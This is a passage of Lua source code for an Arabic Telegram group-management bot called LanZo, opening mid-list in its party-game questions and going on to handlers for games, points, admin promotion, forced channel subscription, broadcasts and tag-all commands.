كرتوني له ذكريات جميلة عندك؟','أخر اتصال جاك من مين ؟','حيوانك المفضل؟','اول ولد لك شنو رح تسميه ؟','سبب الرحيل.؟','قولها بلهجتك « لا أملك المال ».؟','نهارك يصير أجمل بوجود ..؟','‏لو خيروك، الزواج بمن تُحب او تاخذ مليون دولار؟','تاك لشخص سوالفه حلوه ؟','تصرف لا يُمكن أن تتحمله.؟','ماهي الاطباع فيك التي تحاول اخفائها عن الناس؟.','شيء عندك اهم من الناس؟','قد تخيلت شي في بالك وصار ؟','تمحي العشرة الطيبة عشان موقف ماعجبك أو سوء فهم.؟','جربت شعور احد يحبك بس انت متكدر تحبه؟','بنفسك تبوس شخص بهاي الحظه؟','إذا كانت الصراحة ستبعد عنك من تحب هل تمتلك الشجاعة للمصارحة ام لا .؟','أكمل الدعاء بما شئت ‏اللهم أرزقني ..؟','الصق اخر شيء نسخته .؟','‏تفضل جولة في الغابة أم جولة بحرية؟','‏تاك لشخص لديك لا تخفي عنه شي؟','كلمة غريبة ومعناها؟','‏اوقات لا تحب ان يكلمك فيها احد؟','تملك وسواس من شيء معين ؟','اشمر مقطع من اغنيه متطلع منراسك؟','هل تتأثرين بالكلام الرومانسي من الشباب؟','ما اول شيء يلفت انتباهك في الرجل؟','ماذا تفعلين اذا تعرضتِ للتحرش من قبل شخص ما..؟','اذا كنت شخصاً غني هل توافق على الزواج من فتاة فقيرة..؟','ما هو أكثر شئ لا تستطيع تحمله..؟','ما هي نقاط الضعف في شخصيتك..؟','هل توافق أن زوجتك تدفع الحساب في إحدي المطاعم وأنت موجود؟','ماذا تفعل لو أكتشفت ان زوجتك على علاقة بصديقك؟','ما هي أكثر صفة تكرهها في زوجتك..؟','اذا كان لديك فرصة للخروج مع من سوف تخرج ربعك او زوجتك..؟','ماذا تفعل عندما تري دموع زوجتك..؟','إلى أي الرجال تُريدين أن يكون انتماؤك؟','كم مرة خُدعت في أشخاصٍ، وثقتِ فيهم ثقةً عمياء؟','هل ما زال أصدقاء الطفولة أصدقاءً لك حتى الآن؟','هل ترغبين في أن يكون خطيبك وسيمًا؟','كم مرةٍ فعلت شيئًا لا ترغبين في الإفصاح عنه؟','هل استطعت أن تُحققي آمالك العلمية والعاطفية؟','أكثر شئ ندمت على فعله..؟','هل تشعرين أنك فتاة محظوظة..؟','هل علاقة الحب التي كانت في صغرك، مازالت مستمرة؟','ما هو أكثر شئ يفرحك في هذه الحياة..؟','كم مرة أردت شراء ملابس لأنها جميلة ولكنها لا تناسبك..؟','كم عدد المرات التي قمت فيها بإستبدال شئ اشتريته ولم يعجبك بعد ذلك.؟','كم مرة قمت بكسر الرجيم من أجل تناول طعامك المفضل..؟','هل تعرضت للظلم يوماً ما وعلى يد من..؟','هل كذبت على والديك من قبل..؟','هل خرجتي مع شخص تعرفتي عليه من خلال التليكرام من قبل..؟','هل لو تقدم شخص لاختك من أجل خطبتها وقامت برفضه تقبلين به..؟','لمن تقولين لا أستطيع العيش بدونك..؟','كم عدد المرات التي تعرضتِ فيها إلى أزمة نفسية وأردتِ الصراخ بأعلى صوتك..؟','ماذا تقول للبحر؟','أصعب صفة قد تتواجد في رجل؟','ما أجمل الحياة بدون ...؟','لماذا لم تتم خطبتك حتى الآن..؟','نسبة رضاك عن الأشخاص من حولك هالفترة ؟','ما السيء في هذه الحياة ؟','الفلوس او الحب ؟','أجمل شيء حصل معك خلال هذا الاسبوع ؟','سؤال ينرفزك ؟','كم في حسابك البنكي ؟','شي عندك اهم من الناس ؟','اول ولد او بنت الك شنو تسمي ؟','تفضّل النقاش الطويل او تحب الاختصار ؟','عادي تتزوج او تتزوجين من خارج العشيره ؟','كم مره حبيت ؟','تبادل الكراهية بالكراهية؟ ولا تحرجه بالطيب ؟','قلبي على قلبك مهما صار لمنو تكولها ؟','اكثر المتابعين عندك باي برنامج ؟','نسبة النعاس عندك حاليًا ؟','نسبه الندم عندك للي وثقت بيهم ؟','اول شخص تعرفت عليه بالتليكرام بعده موجود ؟','اذا فديوم شخص ضلمك شنو موقفك ؟','افضل عمر للزواج برئيك ؟','انت من النوع الي دائما ينغدر من اقرب الناس اله ؟','ماهو حيوانك المفضل ؟','تاريخ ميلادك ؟','لونك المفضل ؟','انت من النوع العاطفي والي ميكدر يكتم البداخله ؟','اذا فديوم شخص خانك ويريد يرجعلك تقبل ؟','شي بالحياه مخليك عايش لحد الان ؟','تحب النوم لو الشغل ؟','افضل مكان رحت عليه ؟','اختصر الماضي بكلمه وحده ؟','هل سبق وكنت مصر على أمر ما ومن ثم اكتشفت أنك كنت على خطأ ؟','اكثر كلمة ترفع ضغطك ؟','مع او ضد سب البنت للدفاع عن نفسها ؟','يهمك ظن الناس بيك لو لا؟','عبّر عن مودك بصوره ؟','اغلب وقتك ضايع في ؟','يوم متكدر تنساه ؟','تحس انك محظوظ بالاشخاص الي حولك ؟','تستغل وقت فراغك بشنو ؟','مع او ضد مقولة محد يدوم ل احد ؟','لو اخذوك مستشفى المجانين كيف تثبت لهم انك صاحي ؟','مغني تلاحظ أن صوته يعجب الجميع إلا أنت ؟','اخر خيانه ؟','تصرف ماتتحمله ؟','هل يمكنك الكذب والاستمرار بارتكاب الأخطاء كمحاولة منك لعدم الكشف أنك مخطئ ؟','الصق اخر شي نسخته ؟','عمرك انتقمت من أحد ؟','هل وصلك رسالة غير متوقعة من شخص وأثرت فيك ؟','‏-لو امتلكت العصا السحرية ليوم واحد ماذا ستفعل ؟','جابو طاري شخص تكره عندك تشاركهم ولا تمنعهم ؟','أمنية كنت تتمناها وحققتها ؟','هل التعود على شخص والتحدث معه بشكل يومي يعتبر نوع من أنواع الحب ؟','نسبة جمال صوتك ؟','صفة يطلقها عليك الشخص المفضل ؟','شنو هدفك بالمستقبل القريب ؟','تحب القرائه ؟','كليه تتمنى تنقبل بيها ؟',
'أطول مدة قضيتها بعيد عن أهلك ؟','لو يجي عيد ميلادك تتوقع يجيك هدية؟','يبان عليك الحزن من " صوتك - ملامحك','وين تشوف نفسك بعد سنتين؟','وش يقولون لك لما تغني ؟','عندك حس فكاهي ولا نفسية؟','كيف تتصرف مع الشخص الفضولي ؟','كيف هي أحوال قلبك؟','حاجة تشوف نفسك مبدع فيها ؟','متى حبيت؟','شيء كل م تذكرته تبتسم ...','العلاقه السريه دايماً تكون حلوه؟','صوت مغني م تحبه','لو يجي عيد ميلادك تتوقع يجيك هدية؟','اذا احد سألك عن شيء م تعرفه تقول م اعرف ولا تتفلسف ؟','مع او ضد : النوم افضل حل لـ مشاكل الحياة؟','مساحة فارغة (..............) اكتب اي شيء تبين','اغرب اسم مر عليك ؟','عمرك كلمت فويس احد غير جنسك؟','اذا غلطت وعرفت انك غلطان تحب تعترف ولا تجحد؟','لو عندك فلوس وش السيارة اللي بتشتريها؟','وش اغبى شيء سويته ؟','شيء من صغرك ماتغير فيك؟','وش نوع الأفلام اللي تحب تتابعه؟','وش نوع الأفلام اللي تحب تتابعه؟','تجامل احد على حساب مصلحتك ؟','تتقبل النصيحة من اي شخص؟','كلمه ماسكه معك الفترة هذي ؟','متى لازم تقول لا ؟','اكثر شيء تحس انه مات ف مجتمعنا؟','تؤمن ان في "حُب من أول نظرة" ولا لا ؟.','تؤمن ان في "حُب من أول نظرة" ولا لا ؟.','هل تعتقد أن هنالك من يراقبك بشغف؟','اشياء اذا سويتها لشخص تدل على انك تحبه كثير ؟','اشياء صعب تتقبلها بسرعه ؟','اقتباس لطيف؟','أكثر جملة أثرت بك في حياتك؟','عندك فوبيا من شيء ؟.',
'اكثر لونين تحبهم مع بعض؟','أجمل بيت شعر سمعته ...','سبق وراودك شعور أنك لم تعد تعرف نفسك؟','تتوقع فيه احد حاقد عليك ويكرهك ؟','أجمل سنة ميلادية مرت عليك ؟','لو فزعت/ي لصديق/ه وقالك مالك دخل وش بتسوي/ين؟','وش تحس انك تحتاج الفترة هاذي ؟','يومك ضاع على؟','@منشن .. شخص تخاف منه اذا عصب ...','فيلم عالق في ذهنك لا تنساه مِن روعته؟','تختار أن تكون غبي أو قبيح؟','الفلوس او الحب ؟','أجمل بلد في قارة آسيا بنظرك؟','ما الذي يشغل بالك في الفترة الحالية؟','احقر الناس هو من ...','وين نلقى السعاده برايك؟','اشياء تفتخر انك م سويتها ؟','تزعلك الدنيا ويرضيك ؟','وش الحب بنظرك؟','افضل هديه ممكن تناسبك؟','كم في حسابك البنكي ؟','كلمة لشخص أسعدك رغم حزنك في يومٍ من الأيام ؟','عمرك انتقمت من أحد ؟!','ما السيء في هذه الحياة ؟','غنية عندك معاها ذكريات🎵🎻','/','أفضل صفة تحبه بنفسك؟','اكثر وقت تحب تنام فيه ...','أطول مدة نمت فيها كم ساعة؟','أصعب قرار ممكن تتخذه ؟','أفضل صفة تحبه بنفسك؟','اكثر وقت تحب تنام فيه ...','أنت محبوب بين الناس؟ ولاكريه؟','إحساسك في هاللحظة؟','اخر شيء اكلته ؟','تشوف الغيره انانيه او حب؟','اذكر موقف ماتنساه بعمرك؟','اكثر مشاكلك بسبب ؟','اول ماتصحى من النوم مين تكلمه؟','آخر مرة ضحكت من كل قلبك؟','لو الجنسية حسب ملامحك وش بتكون جنسيتك؟','اكثر شيء يرفع ضغطك','اذكر موقف ماتنساه بعمرك؟','لو قالوا لك  تناول صنف واحد فقط من الطعام لمدة شهر .',
'كيف تشوف الجيل ذا؟','ردة فعلك لو مزح معك شخص م تعرفه ؟','احقر الناس هو من ...','تحب ابوك ولا امك','آخر فيلم مسلسل والتقييم🎥؟','أقبح القبحين في العلاقة: الغدر أو الإهمال🤷🏼؟','كلمة لأقرب شخص لقلبك🤍؟','حط@منشن لشخص وقوله "حركتك مالها داعي"😼!','اذا جاك خبر مفرح اول واحد تعلمه فيه مين💃🏽؟','طبع يمكن يخليك تكره شخص حتى لو كنت تُحبه🙅🏻‍♀️؟','افضل ايام الاسبوع عندك🔖؟','يقولون ان الحياة دروس ، ماهو أقوى درس تعلمته من الحياة🏙؟','تاريخ لن تنساه📅؟','تحب الصيف والا الشتاء❄️☀️؟','شخص تحب تستفزه😈؟','شنو ينادونك وانت صغير (عيارتك)👼🏻؟','عقل يفهمك/ج ولا قلب يحبك/ج❤️؟','اول سفره لك وين رح تكون✈️؟','كم عدد اللي معطيهم بلوك👹؟','نوعية من الأشخاص تتجنبهم في حياتك❌؟','شاركنا صورة او فيديو من تصويرك؟📸','كم من عشره تعطي حظك📩؟','اكثر برنامج تواصل اجتماعي تحبه😎؟','من اي دوله انت🌍؟','اكثر دوله ودك تسافر لها🏞؟','مقولة "نكبر وننسى" هل تؤمن بصحتها🧓🏼؟','تعتقد فيه أحد يراقبك👩🏼‍💻؟','لو بيدك تغير الزمن ، تقدمه ولا ترجعه🕰؟','مشروبك المفضل🍹؟','‏قم بلصق آخر اقتباس نسخته؟💭','كم وزنك/ج طولك/ج؟🌚','كم كان عمرك/ج قبل ٨ سنين😈؟','دوله ندمت انك سافرت لها😁؟','لو قالو لك ٣ أمنيات راح تتحقق عالسريع شنو تكون🧞‍♀️؟','‏- نسبة احتياجك للعزلة من 10📊؟','شخص تحبه حظرك بدون سبب واضح، ردة فعلك🧐؟','مبدأ في الحياة تعتمد عليه دائما🕯؟',
}  
Dev_aMeR(msg.chat_id_, msg.id_, 1, ''..LanZoTeam[math.random(#LanZoTeam)]..'' , 1, 'md')  
return false
end
end
--     Source LanZo     --
if text == 'الالعاب' and ChCheck(msg) or text == 'العاب' and ChCheck(msg) or text == 'اللعبه' and ChCheck(msg) or text == '↫ الالعاب ᥀' and ChCheck(msg) then
if not DevaMeR:get(LanZo..'aMeR:Lock:Games'..msg.chat_id_) then
Dev_aMeR(msg.chat_id_, msg.id_, 1,[[
᥀︙قائمة العاب المجموعه ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙لعبة التخمين ↫ خمن
᥀︙لعبة الامثله ↫ امثله
᥀︙لعبة العكس ↫ العكس
᥀︙لعبة الاسئله ↫ اسئله
᥀︙لعبة الروليت ↫ روليت
᥀︙لعبة الحزوره ↫ حزوره
᥀︙لعبة الترتيب ↫ ترتيب
᥀︙لعبة المعاني ↫ معاني
᥀︙لعبة التويت ↫ كت تويت
᥀︙لعبة المختلف ↫ المختلف
᥀︙لعبة السمايلات ↫ سمايلات
᥀︙لعبة المحيبس ↫ المحيبس
᥀︙لعبة الرياضيات ↫ رياضيات
᥀︙لعبة الانكليزيه ↫ انكليزيه
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙نقاطي • بيع نقاطي
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙[Source Channel](https://t.me/Bw5Bw)
]], 1, 'md')
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙عذرا الالعاب معطله في المجموعه', 1, 'md')
end
end
--     Source LanZo     --
if text == 'بيع نقاطي' and ChCheck(msg) then
if tonumber((DevaMeR:get(LanZo..'aMeR:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙لم تربح اي نقطه\n᥀︙ارسل ↫ الالعاب للعب', 1, 'md')
else
DevaMeR0 = (DevaMeR:get(LanZo..'aMeR:GamesNumber'..msg.chat_id_..msg.sender_user_id_) * 50)
DevaMeR:incrby(LanZo..'aMeR:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_,DevaMeR0)
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙تم بيع '..(DevaMeR:get(LanZo..'aMeR:GamesNumber'..msg.chat_id_..msg.sender_user_id_))..' من نقاطك\n᥀︙كل نقطه تساوي 50 رساله', 'md')
DevaMeR:del(LanZo..'aMeR:GamesNumber'..msg.chat_id_..msg.sender_user_id_)
end
end
--     Source LanZo     --
if text == 'رفع المشرفين' and ChCheck(msg) or text == 'رفع الادمنيه' and ChCheck(msg) then  
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 200},function(arg,aMeR) 
local num = 0
local admins = aMeR.members_  
for i=0 , #admins do   
if aMeR.members_[i].bot_info_ == false and aMeR.members_[i].status_.ID == "ChatMemberStatusEditor" then
DevaMeR:sadd(LanZo..'aMeR:Admins:'..msg.chat_id_, admins[i].user_id_)   
num = num + 1
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,dp) 
if dp.first_name_ == false then
DevaMeR:srem(LanZo..'aMeR:Admins:'..msg.chat_id_, admins[i].user_id_)   
end
end,nil)   
else
DevaMeR:srem(LanZo..'aMeR:Admins:'..msg.chat_id_, admins[i].user_id_)   
end 
if aMeR.members_[i].status_.ID == "ChatMemberStatusCreator" then  
Manager_id = admins[i].user_id_  
DevaMeR:sadd(LanZo..'aMeR:BasicConstructor:'..msg.chat_id_,Manager_id)  
DevaMeR:sadd(LanZo..'aMeR:aMeRConstructor:'..msg.chat_id_,Manager_id)   
end  
end  
if num == 0 then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙لا يوجد ادمنيه ليتم رفعهم\n᥀︙تم رفع مالك المجموعه", 1, 'md')
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم رفع '..num..' من الادمنيه \n᥀︙تم رفع مالك المجموعه', 1, 'md')
end
end,nil) 
end
--     Source LanZo     --
if text == 'غادر' and SudoBot(msg) and ChCheck(msg) then
if DevaMeR:get(LanZo.."aMeR:Left:Bot"..LanZo) then
Dev_aMeR(msg.chat_id_,msg.id_, 1, "᥀︙المغادره معطله من قبل المطور الاساسي", 1, 'md')
return false  
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم مغادرة المجموعه \n᥀︙تم حذف جميع بياناتها ', 1, 'md')
ChatLeave(msg.chat_id_, LanZo)
DevaMeR:srem(LanZo.."aMeR:Groups",msg.chat_id_)
end
--     Source LanZo     --
if text ==('موقعي') and ChCheck(msg) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
rtpa = 'المنشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
rtpa = 'الادمن'
elseif da.status_.ID == "ChatMemberStatusMember" then
rtpa = 'عضو'
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙موقعك ↫ '..rtpa, 1, 'md')
end,nil)
end
--     Source LanZo     --
if text == "معلوماتي" and ChCheck(msg) then
function get_me(extra,result,success)
local msguser = tonumber(DevaMeR:get(LanZo..'aMeR:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
local user_msgs = DevaMeR:get(LanZo..'aMeR:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local cont = (tonumber(DevaMeR:get(LanZo..'aMeR:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local user_nkt = tonumber(DevaMeR:get(LanZo..'aMeR:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
if result.username_ then username = '@'..result.username_ else username = 'لا يوجد' end
if result.last_name_ then lastname = result.last_name_ else lastname = '' end
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙اسمك ↫ ❨ ['..result.first_name_..'] ❩\n᥀︙معرفك ↫ ❨ ['..username..'] ❩\n᥀︙ايديك ↫ ❨ `'..result.id_..'` ❩\n᥀︙نقاطك ↫ ❨ '..user_nkt..' ❩\n᥀︙رسائلك ↫ ❨ '..user_msgs..' ❩\n᥀︙جهاتك ↫ ❨ '..cont..' ❩\n᥀︙تفاعلك ↫ '..formsgs(msguser)..'\n᥀︙رتبتك ↫ '..IdRank(msg.sender_user_id_, msg.chat_id_), 1, 'md')
end
getUser(msg.sender_user_id_,get_me)
end
end
--     Source LanZo     --
if text == "تعيين قناة الاشتراك" or text == "تغيير قناة الاشتراك" or text == "تعيين الاشتراك الاجباري" or text == "وضع قناة الاشتراك" or text == "↫ تعيين قناة الاشتراك ᥀" then
if not Sudo(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط ', 1, 'md')
else
DevaMeR:setex(LanZo..'DevaMeR4'..msg.sender_user_id_,360,true)
send(msg.chat_id_, msg.id_, '᥀︙ارسل لي معرف قناة الاشتراك الان')
end
return false  
end
if text == "تفعيل الاشتراك الاجباري" or text == "↫  تفعيل الاشتراك الاجباري ᥀" then  
if not Sudo(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط ', 1, 'md')
else
if DevaMeR:get(LanZo..'aMeR:ChId') then
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevaMeR:get(LanZo.."aMeR:ChId"))
local GetInfo = JSON.decode(Check)
send(msg.chat_id_, msg.id_,"᥀︙الاشتراك الاجباري مفعل \n᥀︙على القناة ↫ [@"..GetInfo.result.username.."]")
else
DevaMeR:setex(LanZo..'DevaMeR4'..msg.sender_user_id_,360,true)
send(msg.chat_id_, msg.id_,"᥀︙لاتوجد قناة لتفعيل الاشتراك\n᥀︙ارسل لي معرف قناة الاشتراك الان")
end
end
return false  
end
if text == "تعطيل الاشتراك الاجباري" or text == "↫  تعطيل الاشتراك الاجباري ᥀" then  
if not Sudo(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط ', 1, 'md')
else
DevaMeR:del(LanZo..'aMeR:ChId')
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل الاشتراك الاجباري'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
end
return false  
end
if text == "حذف قناة الاشتراك" or text == "حذف قناه الاشتراك" or text == "↫ حذف قناة الاشتراك ᥀" then
if not SecondSudo(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط ', 1, 'md')
else
DevaMeR:del(LanZo..'aMeR:ChId')
Dev_aMeR(msg.chat_id_, msg.id_, 1,"᥀︙تم حذف قناة الاشتراك الاجباري", 1, 'md') 
end
end
if SecondSudo(msg) then
if text == 'جلب قناة الاشتراك' or text == 'قناة الاشتراك' or text == 'الاشتراك الاجباري' or text == 'قناة الاشتراك الاجباري' or text == '↫ قناة الاشتراك ᥀' then
if DevaMeR:get(LanZo..'aMeR:ChId') then
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevaMeR:get(LanZo.."aMeR:ChId"))
local GetInfo = JSON.decode(Check)
send(msg.chat_id_, msg.id_, "᥀︙قناة الاشتراك ↫ [@"..GetInfo.result.username.."]")
else
send(msg.chat_id_, msg.id_, "᥀︙لاتوجد قناة في الاشتراك الاجباري")
end
return false  
end end
--     Source LanZo     --
if SudoBot(msg) then
if text == 'اذاعه للكل بالتوجيه' and tonumber(msg.reply_to_message_id_) > 0 then
function LanZoTeam(extra,result,success)
if DevaMeR:get(LanZo.."aMeR:Send:Bot"..LanZo) and not aMeRSudo(msg) then 
send(msg.chat_id_, msg.id_,"᥀︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
local GpList = DevaMeR:smembers(LanZo.."aMeR:Groups")
for k,v in pairs(GpList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
local PvList = DevaMeR:smembers(LanZo.."aMeR:Users")
for k,v in pairs(PvList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم اذاعة رسالتك بالتوجيه \n᥀︙‏في ↫ ❨ '..#GpList..' ❩ مجموعه \n᥀︙والى ↫ ❨ '..#PvList..' ❩ مشترك \n ✓', 1, 'md')
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),LanZoTeam)
end
end
--     Source LanZo     --
if text == "مشاهده المنشور" and ChCheck(msg) or text == "مشاهدات المنشور" and ChCheck(msg) or text == "عدد المشاهدات" and ChCheck(msg) then
DevaMeR:set(LanZo..'aMeR:viewget'..msg.sender_user_id_,true)
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙حسنا قم باعادة توجيه للمنشور الذي تريدني حساب مشاهداته', 1, 'md')
end
--     Source LanZo     --
if text == "سورس" and SourceCh(msg) or text == "السورس" and SourceCh(msg) or text == "يا سورس" and SourceCh(msg) or text == "↫  السورس ᥀" and SourceCh(msg) then
Text = [[
Welcome To Source
᥀︙[LanZo Team](https://t.me/Bw5Bw)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '᥀ Source Channel',url="https://t.me/Bw5Bw"}},
{{text = '᥀ Developer',url="t.me/lMlMMM"},{text = '᥀ Tws LanZo',url="https://t.me/W555Bot"}},{{text= '᥀ Support Source .',url="https://t.me/joinchat/L980Ig8wQnAyN2Vi"}}
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/X6UX6&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
--     Source LanZo     --
if ChatType == 'sp' or ChatType == 'gp'  then
if text == "اطردني" and ChCheck(msg) or text == "ادفرني" and ChCheck(msg) then
if DevaMeR:get(LanZo.."aMeR:Kick:Me"..msg.chat_id_) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevaMeR:set(LanZo..'yes'..msg.sender_user_id_, 'delyes')
DevaMeR:set(LanZo..'no'..msg.sender_user_id_, 'delno')
local Text = '᥀︙هل انت متأكد من المغادره'
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/delyes"},{text="لا",callback_data="/delno"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     Source LanZo     --
if text == 'تعطيل اطردني' and Manager(msg) and ChCheck(msg) then
DevaMeR:set(LanZo.."aMeR:Kick:Me"..msg.chat_id_, true)
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل امر اطردني'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل اطردني' and Manager(msg) and ChCheck(msg) then
DevaMeR:del(LanZo.."aMeR:Kick:Me"..msg.chat_id_)
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل امر اطردني'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
end
--     Source LanZo     --
if text == "نزلني" and ChCheck(msg) then
if DevaMeR:get(LanZo.."aMeR:Del:Me"..msg.chat_id_) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevaMeR:set(LanZo..'yesdel'..msg.sender_user_id_, 'delyes')
DevaMeR:set(LanZo..'nodel'..msg.sender_user_id_, 'delno')
local Text = '᥀︙هل انت متأكد من تنزيلك'
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/yesdel"},{text="لا",callback_data="/nodel"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     Source LanZo     --
if text == 'تعطيل نزلني' and BasicConstructor(msg) and ChCheck(msg) then
DevaMeR:set(LanZo.."aMeR:Del:Me"..msg.chat_id_, true)
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل امر نزلني'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل نزلني' and BasicConstructor(msg) and ChCheck(msg) then
DevaMeR:del(LanZo.."aMeR:Del:Me"..msg.chat_id_)
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل امر نزلني'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
end
--     Source LanZo     --
if text and (text == 'تفعيل التاك' or text == 'تفعيل التاك للكل' or text == 'تفعيل تاك للكل') and Admin(msg) and ChCheck(msg) then 
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل امر تاك للكل'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo..'aMeR:Lock:TagAll'..msg.chat_id_)
end
if text and (text == 'تعطيل التاك' or text == 'تعطيل التاك للكل' or text == 'تعطيل تاك للكل') and Admin(msg) and ChCheck(msg) then 
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل امر تاك للكل'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo..'aMeR:Lock:TagAll'..msg.chat_id_,true)
end
if Admin(msg) then
if text == "تاك للكل" and ChCheck(msg) then
if not DevaMeR:get(LanZo..'aMeR:Lock:TagAll'..msg.chat_id_) then
function TagAll(dp1,dp2)
local text = "᥀︙وينكم يالربع \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if DevaMeR:get(LanZo..'Save:UserName'..v.user_id_) then
text = text..i.."~ : [@"..DevaMeR:get(LanZo..'Save:UserName'..v.user_id_).."]\n"
else
text = text..i.."~ : "..v.user_id_.."\n"
end
end 
Dev_aMeR(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},TagAll,nil)
end
end
--     Source LanZo     --
if text and text:match("^كللهم (.*)$") and ChCheck(msg) then
local txt = {string.match(text, "^(كللهم) (.*)$")}
if not DevaMeR:get(LanZo..'aMeR:Lock:TagAll'..msg.chat_id_) then
function TagAll(dp1,dp2)
local text = "᥀︙"..txt[2].." \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if DevaMeR:get(LanZo..'Save:UserName'..v.user_id_) then
text = text..i.."~ : [@"..DevaMeR:get(LanZo..'Save:UserName'..v.user_id_).."]\n"
else
text = text..i.."~ : "..v.user_id_.."\n"
end
end 
Dev_aMeR(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},TagAll,nil)
end
end
end
--     Source LanZo     --
